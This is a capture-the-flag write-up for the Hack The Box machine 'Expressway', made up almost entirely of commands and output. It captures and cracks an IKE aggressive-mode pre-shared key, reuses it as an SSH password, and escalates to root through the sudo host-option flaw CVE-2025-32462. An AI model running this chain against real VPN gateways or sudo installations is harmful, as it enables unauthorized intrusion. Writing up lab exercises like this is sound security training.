# Target
| Category          | Details                                               |
|-------------------|-------------------------------------------------------|
| 📝 **Name**       | [Expressway](https://app.hackthebox.com/machines/736) |  
| 🏷 **Type**       | HTB Machine                                           |
| 🖥 **OS**         | Linux                                                 |
| 🎯 **Difficulty** | Easy                                                  |
| 📁 **Tags**       | IKE, PSK cracking, CVE-2025-32462                     |

# Scan
### TCP
```
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

### UDP
```
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike
```

# Attack path
1. [Gain initial foothold by resuing cracked IKE PSK as SSH credentials]()
2. [Escalate to `root` user by exploiting CVE-2025-32462]()

### Gain initial foothold by resuing cracked IKE PSK as SSH credentials

#### Scan Internet Key Exchange service running on target
```
┌──(magicrc㉿perun)-[~/attack/HTB Expressway]
└─$ ike-scan -M  $TARGET                   
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.114.84   Main Mode Handshake returned
        HDR=(CKY-R=ff13a57d609e14cb)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.038 seconds (26.37 hosts/sec).  1 returned handshake; 0 returned notify
```

#### Obtain PSK parameters
```
┌──(magicrc㉿perun)-[~/attack/HTB Expressway]
└─$ ike-scan -A --pskcrack=psk.params $TARGET
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.114.84   Aggressive Mode Handshake returned HDR=(CKY-R=3c42e3658396afb3) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.036 seconds (27.83 hosts/sec).  1 returned handshake; 0 returned notify
```

#### User parameters to crack PSK
```
┌──(magicrc㉿perun)-[~/attack/HTB Expressway]
└─$ psk-crack --dictionary=/usr/share/wordlists/rockyou.txt psk.params 
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 5b72494ac950bb67def6830d5626c1f9d3fe3ac0
Ending psk-crack: 8045042 iterations in 12.273 seconds (655486.22 iterations/sec)
```

#### Reuse cracked PSK as SSH password for `ike` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Expressway]
└─$ ssh ike@$TARGET
ike@10.129.114.84's password: 
<SNIP>
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

### Escalate to `root` user by exploiting [CVE-2025-32462](https://nvd.nist.gov/vuln/detail/CVE-2025-32462)

#### Identify vulnerable `sudo` version
```
ike@expressway:~$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

`sudo 1.9.17` has [CVE-2025-32462](https://nvd.nist.gov/vuln/detail/CVE-2025-32462) vulnerability

#### Discover `offramp.expressway.htb` in `squid` logs
`/var/log/squid/access.log.1` has been pointed out by `linpeas.sh`, we can access it as `ike` user is part of `proxy` group.
```
ike@expressway:~$ cat /var/log/squid/access.log.1 
<SNIP>
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
<SNIP>
```

#### List allowed `sudo` commands for `offramp.expressway.htb` host
```
ike@expressway:~$ sudo -l -h offramp.expressway.htb
Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL
```

#### Use `offramp.expressway.htb` to exploit [CVE-2025-32462](https://nvd.nist.gov/vuln/detail/CVE-2025-32462)
```
ike@expressway:~$ sudo -i -h offramp.expressway.htb
root@expressway:~# id
uid=0(root) gid=0(root) groups=0(root)
```
